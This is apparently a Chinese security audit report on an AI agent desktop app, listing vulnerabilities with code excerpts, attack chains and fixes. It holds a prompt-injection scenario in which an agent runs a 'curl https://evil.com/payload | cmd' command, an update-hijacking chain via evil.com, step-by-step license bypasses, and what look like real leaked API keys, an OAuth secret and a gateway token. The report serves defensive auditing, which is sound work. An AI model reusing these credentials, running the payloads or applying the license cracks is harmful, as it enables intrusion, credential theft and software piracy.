以下 5 个扩展在发布包中同时附带 TypeScript 源码（`.ts`）和已编译 JavaScript（`.js`），但运行时 JavaScript 经过商业级代码混淆（`_0x` 前缀变量、hex 字符串编码、自解码执行器）：

| 扩展 | 混淆 JS 文件数 | 混淆 JS 大小 |
|------|-------------|------------|
| `dingtalk` | 11 / 11 | 548 KB |
| `feishu` | 22 / 23 | 1,019 KB |
| `openclawwechat` | 15 / 15 | 518 KB |
| `qqbot` | 7 / 7 | 213 KB |
| `wecom` | 6 / 7 | 371 KB |
| **合计** | **61 / 63** | **~2.6 MB** |

特别关注 `openclawwechat`：
- 含 `anti-detection.ts` / `anti-detection.js`（53KB 混淆），实现**键盘仿真延迟和速率限制**以规避微信检测
- 混淆 JS **实际执行**，TypeScript 仅作参考；无法验证两者一致

其余 31 个扩展均不进行混淆，仅此 5 个 CN 扩展例外——这是一个危险信号。

#### 影响

- 无法通过静态分析确认是否存在数据外泄、凭证收集、C2 通信等恶意行为
- CI/CD 无法验证编译产物是否来自附带的 TypeScript 源码
- 被供应链攻击时难以察觉

#### 修复方案

1. **移除扩展 JS 混淆**，或建立可复现的构建流程（从 TS 源码编译，diff 对比）
2. 在 CI 中增加步骤：从源码编译各扩展，并与发布包中的 JS 做 SHA256 对比
3. 若业务需要混淆，提供带签名的 source map 供安全团队审计

---

### [HIGH-05] Tauri WebView CSP 启用 unsafe-inline + unsafe-eval

**严重度**：High
**位置**：`apps/desktop/src-tauri/tauri.conf.json` → `app.security.csp`
**CVSS 向量**：AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N（XSS 链）

#### 描述

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' http://127.0.0.1:19002 http://localhost:19002;
```

CSP 中 `script-src` 同时包含 `unsafe-inline` 和 `unsafe-eval`，实际上**完全绕过 XSS 防护**。

背景：Tauri `main.rs` 中 `window.eval()` 调用要求 `unsafe-eval`。

#### 攻击链（XSS → 原生权限升级）

若应用中存在任何 XSS（例如 AI 返回内容渲染、扩展注入恶意内容、URL 参数反射），攻击者可：

1. 注入 `<script>` 或 `eval()` payload
2. 调用 `window.__TAURI_INTERNALS__.invoke("get_gateway_info")` → 获取 Gateway Token
3. 用 Token 连接 Gateway WebSocket，执行任意 Agent 命令（`exec`、`fs_write` 等危险工具）
4. 调用 `plugin:shell|open` 打开任意 URI（含 `file://`、自定义协议）
5. 完整控制用户 AI 账户、本地文件系统（在 Agent 权限范围内）

此外，`img-src https:` 允许从任意 HTTPS 域加载图片，可用于时序侧信道攻击（DNS prefetch exfiltration）。

#### 修复方案

1. 移除 `unsafe-eval`：将 `main.rs` 中的 `window.eval()` 改为 Tauri 原生事件 / IPC
2. 移除 `unsafe-inline`：改用 nonce-based CSP（Tauri 2.x 原生支持 `csp-nonce`）
3. `shell:allow-open` 增加 URL scope（限制为 `https://` 和 `mailto:` 协议）

---

### [MED-06] Tauri shell:open 无 URL 范围限制

**严重度**：Medium
**位置**：`apps/desktop/src-tauri/capabilities/default.json` → `shell:allow-open`；`tauri.conf.json` → `plugins.shell.open: true`
**CVSS 向量**：AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N

#### 描述

```json
// tauri.conf.json
"plugins": {
  "shell": {
    "open": true   // 无任何 URL 模式限制
  }
}
```

`shell:allow-open` 能够以系统默认处理器打开任意路径或 URL。无范围配置意味着可传入：
- `file:///C:/Windows/System32/...`（打开系统文件浏览器定位到敏感目录）
- `ms-settings:privacy`、`ms-taskmgr:`（打开 Windows 系统页面）
- 任意自定义协议（若系统注册了恶意协议处理器）

结合 HIGH-05 的 XSS：攻击者可通过 `invoke("plugin:shell|open", {path: "file:///..."})` 触发。

#### 修复方案

```json
"plugins": {
  "shell": {
    "open": "^https?://(localhost|127\\.0\\.0\\.1)|^mailto:|^tel:"
  }
}
```
限制为 `https?://`、`mailto:`、`tel:` 协议。

---

### [MED-07] 扩展安装无平台级签名校验

**严重度**：Medium
**位置**：`resources/dist/daemon-cli.js` → 扩展安装逻辑
**CVSS 向量**：AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N

#### 描述

扩展通过 npm 从 CN mirror（`registry.npmmirror.com`）安装，依赖 npm 的包完整性机制（`package-lock.json` + SHA512 哈希）。但 ClawdbotCN 平台本身**不对扩展包做额外签名验证**：

- 无扩展发布者验证（任何人可发布 `@openclawcn/xxx`）
- 无扩展内容扫描（dangerous code patterns、权限清单对比）
- npm mirror 可能被 BGP 劫持或遭受供应链污染

运行时扩展执行在 Node.js 上下文中，具备完整的 `fs`、`child_process`、`net` 访问权限。

#### 修复方案

1. 引入扩展 GPG 签名机制：官方扩展由团队私钥签名，客户端验证签名后方可安装
2. 扩展安装后进行 static scan（forbidden patterns：`exec`、`child_process`、`eval`）
3. 对非官方扩展显示明确的安全警告

---

### [MED-08] Tauri Sidecar Gateway Token 由非 CSPRNG 生成

**严重度**：Medium
**位置**：`apps/desktop/src-tauri/src/sidecar.rs` → Token 生成逻辑
**CVSS 向量**：AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N

#### 描述

Tauri `sidecar.rs` 使用 `DefaultHasher`（SipHash，**非密码学安全**）和以下种子生成 Gateway Token：

```rust
// sidecar.rs（源码注释确认）
// This is NOT a CSPRNG.
// Seed: SystemTime::now() + std::process::id()
let token = DefaultHasher::new()
    .hash(startup_time)
    .hash(process_id)
    .finish();
```

若攻击者知道大概的启动时间窗口（分钟级）和进程 PID 范围（Windows 通常递增），可枚举约 10^6 个候选 token，在本地进行暴力破解。

此 Token 仅用于 Tauri WebView 与本地 Gateway 之间的认证，实际利用窗口极小（需本机访问）。但鉴于 Gateway 持有用户所有 AI 账户凭证，应使用 CSPRNG。

#### 修复方案

```rust
use rand::Rng;
let token: String = rand::thread_rng()
    .sample_iter(&rand::distributions::Alphanumeric)
    .take(32).map(char::from).collect();
```
使用 `rand` crate 的 CSPRNG，或调用 `getrandom` 系统调用。

---

### [LOW-03] 安全原生模块（openclawcn_native.node）缺失，JS fallback 永远激活

**严重度**：Low
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` → 安全模块加载逻辑
**CVSS 向量**：AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N

#### 描述

安全层设计了一个原生 C++ addon（`openclawcn_native.node`），用于提供更难以调试/绕过的硬化实现：
- `computeFileHash()`（文件完整性）
- RSA 验证（许可证签名）
- 反调试检测

代码的加载逻辑是：尝试加载 native addon，失败时 fallback 到纯 JS 实现。

**问题**：`native/build/Release/openclawcn_native.node` **在安装包中不存在**，native addon 从未被打包。因此：
1. 所有"硬化"安全检测实际上运行 JS fallback
2. JS fallback 可通过断点调试、代码注入直接绕过
3. 设计文档中"原生 C++ 强化"的安全承诺未兑现

#### 影响

安全层的整体鲁棒性低于设计预期，但日常使用无功能影响。对于专业破解者，JS fallback 比 native code 更易绕过。

#### 修复方案

- 构建 `openclawcn_native.node` 并将其打入安装包（路径 `native/build/Release/`）
- 或删除 native addon 加载逻辑，明确表示仅使用 JS 实现（降低预期）

---

## 二-B、第五轮新增漏洞详情（License / 更新 / WebSocket / 进程间通信 / 日志）

---

### [CRIT-06] `OPENCLAWCN_DEV=1` 环境变量完全绕过 License 在线验证

**严重度**：Critical
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 30952–30996 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N

#### 描述

当 `process.env.OPENCLAWCN_DEV === "1"` 时，License 在线验证失败（任何网络错误）不会拒绝，而是自动写入一个有效的 "test" 许可证：

```javascript
if (process.env.OPENCLAWCN_DEV === "1") {
    await writeConfigFile({
        ...loadConfig(),
        license: {
            key,
            status: "dev",
            expiresAt: void 0,
            validatedAt: (new Date()).toISOString()
        }
    });
    updateGatewayLicenseState({
        checking: false,
        valid: true,
        offlineMode: false,
        license: {
            tier: "test",
            tierName: "开发版",
            expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1e3).toISOString(),
            daysRemaining: 365,
            keyType: "test",
            features: []
        },
        lastVerifiedAt: Date.now(),
    });
    sendJson(res, 200, { ok: true, data: { valid: true, message: "开发模式：跳过在线验证" } });
}
```

#### 攻击步骤

1. 设置 `OPENCLAWCN_DEV=1` 环境变量
2. 配合防火墙规则阻断 `www.obplugins.cn`（或简单断网）
3. 输入任意字符串作为 License Key
4. 验证失败 → 进入 catch 块 → 自动授予 365 天完整许可

#### 影响

生产版本中的开发后门。任何用户无需有效 License Key 即可永久使用。

#### 修复方案

- **立即**：从生产构建中通过编译时条件移除 `OPENCLAWCN_DEV` 逻辑（`#ifdef DEV`），或改为检查 `.jsc` 安全模块下发的布尔标志
- 开发环境使用独立的 License 服务端点（而非客户端绕过）

---

### [HIGH-06] 更新包校验为自引用——无独立签名验证

**严重度**：High
**位置**：`resources/dist/update-check-LZWLf_z7.js` 第 348–387、564–585、633–644 行
**CVSS 向量**：AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

#### 描述

更新机制流程：
1. 从 `resolveUpdateServerUrl()` 获取更新服务器地址（默认 `https://dl.obplugins.cn`）
2. 下载 `latest.json` 获取版本、delta URL、SHA-256 哈希、checksums URL
3. 下载 delta 包后用 `latest.json` 中的 SHA-256 校验

```javascript
// update-check-LZWLf_z7.js 第 348–361 行
if (delta.sha256) {
    const actualHash = await sha256File(downloadPath);
    if (actualHash !== delta.sha256) { /* reject */ }
}

// 第 387 行——checksums URL 也来自同一服务器
if (!(latest.url?.checksums ? await verifyChecksums(root, latest.url.checksums) : true)) {
// 注意：若 checksums URL 不存在，条件直接为 true（跳过校验）
```

**关键问题**：SHA-256 哈希和 checksums 文件均**来自同一个可被劫持的服务器**。控制更新服务器的攻击者可同时提供恶意 delta 包及其匹配的哈希值。**不存在独立的 RSA/GPG 签名信任锚。**

此外，更新服务器 URL 可被覆盖：

```javascript
// 第 633–644 行
function resolveUpdateServerUrl(root) {
    const envUrl = process.env.OPENCLAWCN_UPDATE_SERVER?.trim();
    if (envUrl) return envUrl;  // ← 环境变量劫持
    const installJson = JSON.parse(fs.readFileSync(path.join(root, "install.json"), "utf-8"));
    if (installJson.updateServer) return installJson.updateServer;  // ← 文件篡改
    return "https://dl.obplugins.cn";
}
```

#### 攻击链

**场景 A（环境变量劫持）**：
1. 设置 `OPENCLAWCN_UPDATE_SERVER=https://evil.com`
2. 在 evil.com 上放置恶意 `latest.json` + 恶意 delta + 匹配的 SHA-256
3. 用户检查更新 → 下载并执行恶意更新包

**场景 B（MITM + 企业代理/流氓 CA）**：
1. 在用户系统中安装流氓 CA 证书（企业环境、恶意软件）
2. 中间人劫持 `dl.obplugins.cn` 流量
3. 返回恶意 `latest.json`、delta、checksums

#### 修复方案

- 使用 Ed25519 或 RSA-2048 对更新包进行**独立签名**，公钥编译入客户端
- 锁定 `resolveUpdateServerUrl()`，移除环境变量覆盖（或至少在正式构建中移除）
- `checksums` 不存在时应**拒绝更新**（而非默认通过）

---

### [HIGH-07] CN 默认安全配置将 cmd/powershell 加入执行白名单且禁用用户确认

**严重度**：High
**位置**：`resources/dist/daemon-cli.js` 第 2277–2326 行
**CVSS 向量**：AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

#### 描述

CN 默认安全配置如下：

```javascript
const CN_DEFAULT_SECURITY_CONFIG = {
    sandbox: { mode: "off", scope: "agent", workspaceAccess: "rw" },
    tools: {
        exec: {
            security: "full",
            ask: "off",           // ← 无需用户确认
            allowlist: [
                "cmd",            // ← Windows 完整 shell
                "powershell",     // ← PowerShell 完整 shell
                "python", "python3", "node", "npm", "git",
                // ...更多
            ]
        }
    }
};
```

虽然 `shouldSpawnWithShell()` 始终返回 `false`（进程直接执行，不经过 shell 解释器），但将 `cmd` 和 `powershell` 加入白名单意味着 AI Agent 可直接执行：

```
cmd /c "任意恶意命令"
powershell -Command "Invoke-WebRequest ..."
```

结合 `ask: "off"`，无需任何用户交互确认。

#### 攻击向量（AI 提示注入）

1. 恶意网页/文档内容被 AI Agent 读取
2. 提示注入内容指示 Agent 执行 `cmd /c "curl https://evil.com/payload | cmd"`
3. 由于 `cmd` 在白名单中且 `ask: "off"`，命令直接执行
4. 攻击者获得完整的 shell 权限

#### 修复方案

- **立即**从 `allowlist` 中移除 `cmd` 和 `powershell`
- 将 `ask` 设置为 `"always"`（至少对 `cmd`/`powershell`/`python` 等完整 shell 环境）
- 考虑将 `sandbox.mode` 默认改为 `"prompt"`

---

### [HIGH-08] License 元数据（tier/expiry/features）明文存储于配置文件，可直接篡改

**严重度**：High
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 30858–30876 行；配置文件 `~/.openclawcn/openclawcn.json`
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N

#### 描述

License 验证结果写入 `openclawcn.json` 时，仅 `license.key` 字段标记为 sensitive（加密存储），其余元数据全部明文：

```javascript
await writeConfigFile({
    ...config,
    license: {
        key,                    // ← 加密（ENC{...}）
        status: result.license?.tier ?? "basic",       // ← 明文
        expiresAt: result.license?.expiresAt,          // ← 明文
        tier: result.license?.tier,                    // ← 明文
        daysRemaining: result.license?.daysRemaining,  // ← 明文
        features: result.license?.features,            // ← 明文
        offlineValidUntil: ...,                        // ← 明文
    }
});
```

#### 攻击步骤

1. 打开 `~/.openclawcn/openclawcn.json`
2. 修改 `license.tier` 为 `"enterprise"`
3. 修改 `license.expiresAt` 为 `"2099-12-31T23:59:59Z"`
4. 修改 `license.offlineValidUntil` 为远未来日期
5. 修改 `license.features` 为完整功能列表
6. 断网启动（使用离线缓存）
7. 获得永久企业版许可证

#### 修复方案

- 将完整 License 元数据作为不透明加密 blob 存储（或使用 HMAC 签名保护完整性）
- License 元数据应由服务端 RSA 签名的 JWT/JWS token 表示，客户端仅验证签名
- 离线缓存的 `offlineValidUntil` 应纳入签名 payload，防止客户端篡改

---

### [MED-09] 更新服务器 URL 可被环境变量或 install.json 劫持

**严重度**：Medium
**位置**：`resources/dist/update-check-LZWLf_z7.js` 第 633–644 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N

#### 描述

```javascript
function resolveUpdateServerUrl(root) {
    const envUrl = process.env.OPENCLAWCN_UPDATE_SERVER?.trim();
    if (envUrl) return envUrl;
    try {
        const installJson = JSON.parse(fs.readFileSync(path.join(root, "install.json"), "utf-8"));
        if (installJson.updateServer) return installJson.updateServer;
    } catch {}
    return "https://dl.obplugins.cn";
}
```

此漏洞与 HIGH-06 关联，提供了两个劫持入口。独立列出是因为 `install.json` 位于安装目录（通常所有用户可读写），而环境变量劫持在共享环境中风险尤高。

#### 修复方案

- 正式构建中硬编码更新服务器 URL，移除环境变量和 `install.json` 覆盖
- 或配合 HIGH-06 的签名方案，使 URL 劫持无法推送恶意更新

---

### [MED-10] process.env 全量继承给子进程（含 Gateway Token 和 API Key）

**严重度**：Medium
**位置**：`resources/dist/daemon-cli.js` 第 1710–1727 行；`gateway-cli-kSg0il7V.js` 第 36320 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

#### 描述

命令执行时将完整 `process.env` 传递给子进程：

```javascript
// daemon-cli.js 第 1710–1713 行
const mergedEnv = env ? { ...process.env, ...env } : { ...process.env };
```

同时，Gateway Token 在启动时被显式写入 `process.env`：

```javascript
// gateway-cli-kSg0il7V.js 第 36320 行
if (token) process.env.OPENCLAWCN_GATEWAY_TOKEN = token;
```

`validateEnvVars()` 仅过滤 `NODE_OPTIONS`、`LD_PRELOAD` 等代码注入变量，**不过滤**：
- `OPENCLAWCN_GATEWAY_TOKEN`
- `OPENCLAWCN_GATEWAY_PASSWORD`
- `ANTHROPIC_API_KEY`、`OPENAI_API_KEY` 等 AI Provider 凭证

#### 影响

所有子进程（MCP 服务器、工具执行、扩展进程）均可通过 `process.env` 直接读取 Gateway Token 和用户的 AI API Key。恶意 MCP 插件可将这些凭证外泄。

#### 修复方案

- 创建子进程时使用**最小化环境变量白名单**（仅传递 `PATH`、`HOME`、`TEMP` 等必要变量）
- 对 Gateway Token 使用内存传递（IPC channel），不经过 `process.env`
- 至少过滤所有 `OPENCLAWCN_*`、`CLAWDBOT_*`、`*_API_KEY`、`*_SECRET` 模式的环境变量

---

### [MED-11] `safeEqualSecret()` 时序侧信道——长度泄露

**严重度**：Medium
**位置**：`resources/dist/auth-DiFlDq5l.js` 第 260–265 行
**CVSS 向量**：AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

#### 描述

```javascript
function safeEqualSecret(provided, expected) {
    if (typeof provided !== "string" || typeof expected !== "string") return false;
    const providedBuffer = Buffer.from(provided);
    const expectedBuffer = Buffer.from(expected);
    if (providedBuffer.length !== expectedBuffer.length) return false;  // ← 时序泄露
    return timingSafeEqual(providedBuffer, expectedBuffer);
}
```

`timingSafeEqual()` 要求两个 Buffer 等长才能比较。当前实现在长度不等时**立即返回 false**，而等长时需执行逐字节比较。攻击者可通过测量响应时间差异来确定 Gateway Token/密码的精确字节长度。

#### 修复方案

```javascript
function safeEqualSecret(provided, expected) {
    const providedBuf = Buffer.from(provided);
    const expectedBuf = Buffer.from(expected);
    const hmacKey = crypto.randomBytes(32);
    const a = crypto.createHmac("sha256", hmacKey).update(providedBuf).digest();
    const b = crypto.createHmac("sha256", hmacKey).update(expectedBuf).digest();
    return timingSafeEqual(a, b);
}
```

先 HMAC 两个值（使得长度固定为 32 字节），再用 `timingSafeEqual` 比较。

---

### [MED-12] `/api/health` 端点无鉴权泄露 Provider 配置状态

**严重度**：Medium
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 33298–33320 行
**CVSS 向量**：AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

#### 描述

```javascript
// 无鉴权，对所有 HTTP 请求返回
for (const [id, prov] of Object.entries(healthConfig.models.providers))
    providers[id] = { status: prov.apiKey || prov.auth ? "ok" : "unconfigured" };
```

`/api/health` 端点对外暴露：
- 已配置的 AI Provider 列表及其状态（`ok` / `unconfigured`）
- Gateway PID 和 uptime
- 是否需要 Setup

#### 影响

未认证的攻击者可获知目标使用了哪些 AI Provider（Anthropic、OpenAI、Kimi 等），用于定向攻击。

#### 修复方案

- `/api/health` 仅返回简单的 `{ status: "ok" }` 给未认证请求
- Provider 详细状态需认证后才可查看

---

### [MED-13] ESM Gateway 主 bundle 未纳入完整性校验范围

**严重度**：Medium
**位置**：`resources/dist/gateway-cli-kSg0il7V.js`（36,563 行，完整可读 JS）
**CVSS 向量**：AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:N

#### 描述

`security/integrity-hashes.json` 包含各 `.jsc` 文件和部分 `.js` 文件的 SHA-256 哈希，由 `integrity.jsc` 在运行时巡逻监控。但 **ESM 格式的 gateway-cli 主 bundle 不在巡逻范围内**。

这意味着攻击者可以直接修改 `gateway-cli-kSg0il7V.js` 中的：
- `verifyLicenseResponseSignature()` → 返回 true
- `verifyTokenSignature()` → 返回 true
- `RSA_PUBLIC_KEY` → 替换为自己的公钥
- License 验证逻辑 → 跳过所有检查

修改后**不会触发任何完整性告警**。

#### 修复方案

- 将所有 ESM bundle 纳入 `integrity-hashes.json` 的巡逻范围
- 或将 License 关键逻辑全部迁移到 `.jsc` 字节码中（ESM bundle 仅作为 shim 调用 `.jsc` 导出）

---

### [MED-14] Config 审计日志记录 process.argv（含命令行 Token）

**严重度**：Medium
**位置**：`resources/dist/daemon-cli.js` 第 10179–10203 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

#### 描述

```javascript
// 第 10187 行
argv: process.argv.slice(0, 8),
```

配置写入审计日志（`config-audit.jsonl`）时记录前 8 个命令行参数。若 Gateway 通过 `--token <value>` 启动，Token 值将被持久化记录在审计日志文件中（虽然文件权限为 0600）。

#### 修复方案

- 审计日志中对 `argv` 做脱敏处理（`--token` 后的值替换为 `***`）
- 或不记录 `argv`，改为记录非敏感的启动参数

---

### [LOW-04] 临时文件名使用 `Math.random()`（可预测）

**严重度**：Low
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 5020 行
**CVSS 向量**：AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N

#### 描述

```javascript
const tmp = `${filePath}.${process.pid}.${Math.random().toString(16).slice(2)}.tmp`;
```

临时文件名中的随机部分使用 `Math.random()`，其输出在已知初始状态时可预测。在多用户系统上可能被利用进行 symlink 竞态攻击。

**注意**：其他位置（如 `randomUUID()`）使用了 CSPRNG，存在不一致。

#### 修复方案

- 统一使用 `crypto.randomUUID()` 或 `crypto.randomBytes(16).toString('hex')` 生成临时文件名

---

### [LOW-05] Setup Wizard CORS 允许所有 localhost 端口

**严重度**：Low
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 31391–31393 行
**CVSS 向量**：AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N

#### 描述

```javascript
if (parsed.hostname === "localhost" || parsed.hostname === "127.0.0.1" ||
    origin === "tauri://localhost")
    res.setHeader("Access-Control-Allow-Origin", origin);
```

任何运行在 localhost 任意端口的网页均可跨域请求 Setup Wizard API（包括 `/api/setup/browse-directory` 和 `/api/setup/configure-provider`）。

#### 影响

本机任何 HTTP 服务（浏览器扩展的本地端口、开发服务器、恶意软件 HTTP 服务器等）均可利用 CORS 策略调用 Setup API。

#### 修复方案

- CORS 允许来源限制为 `tauri://localhost` 和精确的 Gateway 端口（如 `http://localhost:18789`）

---

### [LOW-06] WebSocket Hello 响应泄露 hostname 和 Git Commit Hash

**严重度**：Low
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 35141–35148 行
**CVSS 向量**：AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

#### 描述

```javascript
const helloOk = {
    type: "hello-ok",
    server: {
        version: process.env.OPENCLAWCN_VERSION ?? "dev",
        commit: process.env.GIT_COMMIT,
        host: os.hostname(),    // ← 泄露主机名
        connId
    },
};
```

认证后的 WebSocket 客户端可获取服务器主机名和精确的 Git Commit Hash，用于：
- 识别目标机器（结合 MED-04 的 deviceId）
- 定位精确的代码版本（commit hash → 查找对应版本的已知漏洞）

#### 修复方案

- 移除 `host` 字段（或改为匿名 hash）
- `commit` 字段仅在开发模式下返回

---

### [LOW-07] License HMAC 请求签名使用 License Key 自身作为密钥

**严重度**：Low
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 28678–28698、29278 行
**CVSS 向量**：AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N

#### 描述

```javascript
function generateSign(key, deviceId, timestamp, nonce, secretKey) {
    const data = `${key}|${deviceId}|${timestamp}|${nonce}`;
    return crypto.createHmac("sha256", secretKey).update(data, "utf8").digest("hex");
}

// 调用处（第 29278 行）
const signParams = generateSignParams(licenseKey, deviceId, licenseKey);
//                                                          ↑ 密钥 = License Key 本身
```

HMAC 签名的密钥就是被签名数据的一部分（License Key），这使得 HMAC 仅起到防止无 Key 方猜测 API 调用的作用，不提供任何额外的安全性。

#### 修复方案

- License API 应使用服务端颁发的独立 HMAC 密钥（如 License 激活时服务端返回一个 `hmac_secret`）
- 或改用 RSA 签名请求（客户端生成密钥对，公钥注册到服务端）

---

## 二-C、第五轮正面发现（防御有效的安全措施）

| 安全措施 | 评价 | 位置 |
|---------|------|------|
| WebSocket 消息帧验证 | ✅ 完善（JSON 解析 + schema 校验 + 方法级权限） | `gateway-cli` 34604–35266 |
| Scope-based 访问控制 | ✅ 完善（node/operator/admin 三级） | `gateway-cli` 18151–18172 |
| 消息大小限制 | ✅ 8MiB payload + 16MiB buffer 背压 | `gateway-cli` 6944, 33987 |
| `shouldSpawnWithShell()` 始终返回 false | ✅ 最关键的命令注入防御 | `daemon-cli` 1694 |
| 环境变量注入保护 | ✅ 阻断 `NODE_OPTIONS`、`LD_PRELOAD` 等 | `daemon-cli` 1636–1653 |
| CWD 路径遍历保护 | ✅ 系统目录黑名单 + baseDir 约束 | `daemon-cli` 1619–1677 |
| 可执行文件安全校验 | ✅ 拒绝 shell 元字符、控制字符、引号 | `daemon-cli` 3644–3665 |
| 文件服务 realpath + inode 验证 | ✅ 防 symlink 攻击和 TOCTOU 竞态 | `gateway-cli` 19319–19389 |
| Challenge-Response Nonce | ✅ 远程 WebSocket 防重放 | `gateway-cli` 35352–34910 |
| 设备签名 + 时间戳校验 | ✅ 600s 偏移容忍 + 公钥派生 deviceId | `gateway-cli` 34844–34966 |
| 认证速率限制 | ✅ 按 IP 滑动窗口 | `auth-DiFlDq5l.js` |
| SQL 参数化查询 | ✅ 全部使用 `?` 占位符 | `gateway-cli` 461, `db-Ce_906au.js` 420 |
| FTS5 关键词消毒 | ✅ 移除操作符 + Unicode 安全 | `gateway-cli` 455, `db-Ce_906au.js` 410 |
| ORDER BY 白名单 | ✅ 防 SQL 注入 | `gateway-cli` 435, `db-Ce_906au.js` 390 |
| 临时目录安全检查 | ✅ 所有权/权限/symlink 检查 | `daemon-cli` 244–293 |
| 延迟执行机制（Delayed Enforcement） | ✅ 内存态 + 渐进降级，增加破解难度 | `gateway-cli` 29466–29487 |
| 敏感 Buffer 擦除 | ✅ `wipeSensitiveBuffer()` 清零 | `daemon-cli` 8546 |
| 原子文件写入 | ✅ tmp + rename 模式 | `gateway-cli` 5020 |

---

## 三、安全模块评估

### `.jsc` 字节码保护层

共 11 个字节码安全模块，基于 **Node.js 22 V8 字节码 + bytenode 1.5.7**：

| 模块 | 功能 | 保护状态 |
|------|------|---------|
| `content-vault.jsc` | 加密/解密核心 | ⚠️ 算法已在明文JS泄露 |
| `anti-debug.jsc` | 反调试检测 | ✅ 有效（但可绕过） |
| `integrity.jsc` | 文件完整性巡逻 | ✅ 有效 |
| `process-integrity.jsc` | 进程完整性监控 | ✅ 有效 |
| `ai-tamper-protection.jsc` | AI 防篡改/Honeypot | ✅ 有效 |
| `audit.jsc` / `audit-extra.jsc` | 安全审计 | ✅ 有效 |
| `skill-scanner.jsc` | Skill 内容扫描 | ✅ 有效 |
| `string-vault.jsc` | 内存敏感字符串保护 | ✅ 有效 |
| `windows-acl.jsc` | Windows ACL 控制 | ✅ 有效 |
| `delayed-enforcement.jsc` | 违规延迟执行 | ✅ 有效 |
| `external-content.jsc` | 外部内容安全检测 | ✅ 有效 |

**结论**：字节码层本身质量较好，但被 `daemon-cli.js` 明文泄露架空了最核心的 `content-vault` 保护。

---

## 四、最短攻击路径（由易到难）

| 路径 | 所需技能 | 预估时间 | 关联漏洞 |
|------|---------|---------|---------|
| 获取硬编码 SiliconFlow API Key | 会用7-Zip + 会grep | 5 分钟 | CRIT-02 |
| 解码 Google OAuth Client Secret | `atob()` 一行 | 10 秒 | CRIT-04 |
| 获取硬编码 Gateway Token `clawdbot2026` | 用文本编辑器打开bat | 1 分钟 | CRIT-03 |
| 读取用户所有 AI API Key（auth-profiles.json） | 会用文本编辑器 | 1 分钟 | CRIT-05 |
| **环境变量绕过 License 验证（永久免费）** | **设置 1 个环境变量 + 断网** | **2 分钟** | **CRIT-06** |
| **篡改 License 元数据获得永久企业版** | **会用文本编辑器** | **3 分钟** | **HIGH-08** |
| 用硬编码 token 接管 Gateway WebSocket | 会用WebSocket客户端 | 10 分钟 | CRIT-03 |
| 读取60个有明文副本的技能内容 | 会用7-Zip | 2 分钟 | CRIT-01 |
| 解密11个纯ENC技能文件 | 会写10行Node.js | 30 分钟 | CRIT-01 |
| 调用无鉴权 Setup API 写配置/遍历文件 | 会用curl | 10 分钟 | HIGH-02 |
| 环境变量绕过加密/重定向配置 | 了解环境变量 | 5 分钟 | HIGH-01、MED-05 |
| **劫持更新服务器推送恶意更新** | **环境变量 + 搭建 HTTPS 服务器** | **30 分钟** | **HIGH-06、MED-09** |
| **AI 提示注入获取 shell 执行权** | **构造恶意文档/网页** | **数分钟～数小时** | **HIGH-07** |
| **Patch gateway-cli JS 绕过 License RSA 验证** | **会用文本编辑器** | **10 分钟** | **MED-13** |
| **恶意 MCP 插件读取 process.env 窃取凭证** | **编写 MCP 插件** | **1 小时** | **MED-10** |
| XSS → invoke get_gateway_info → 接管 Agent | XSS 利用 + Tauri IPC 知识 | 数小时 | HIGH-05、MED-06 |
| 绕过SHA256完整性校验 | 会编辑文本文件 | 20 分钟 | LOW-01 |
| 逆向混淆扩展 JS 寻找隐藏行为 | JS 逆向工程 | 数天 | HIGH-04 |
| 逆向 `.jsc` V8 字节码 | V8内部知识 / frida | 数天以上 | — |

---

## 五、修复优先级

### P0（立即处理，不可发版）

1. **[CRIT-02]** 轮换硬编码 SiliconFlow API Key `sk-bdlrjsxfgryopcpjvqbuyygzchkisgzwqucnbdkzurzueukv`
2. **[CRIT-04]** 吊销并重新生成 Google OAuth Client Secret `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`，改为环境变量注入
3. **[CRIT-03]** 从启动脚本中移除硬编码 token `clawdbot2026`，改为首次安装时随机生成
4. **[CRIT-01]** 删除 `daemon-cli.js` 中的密钥派生逻辑（或迁移到服务端方案）
5. **[CRIT-05]** 接入 `saveAuthProfileStoreEncrypted()`，对 `auth-profiles.json` 进行 AES-256-CBC 加密存储；Windows 平台启用 NTFS ACL
6. **[CRIT-06]** 🆕 从生产构建中移除 `OPENCLAWCN_DEV=1` 绕过 License 验证的逻辑（编译时剥离或改为 .jsc 安全模块下发标志）

### P1（下一版本前完成）

7. **[HIGH-06]** 🆕 更新包增加 Ed25519/RSA 独立签名验证（签名公钥编译入客户端），移除更新服务器 URL 的环境变量覆盖
8. **[HIGH-07]** 🆕 从 CN 默认安全配置中移除 `cmd`/`powershell`，将 `ask` 设为 `"always"`
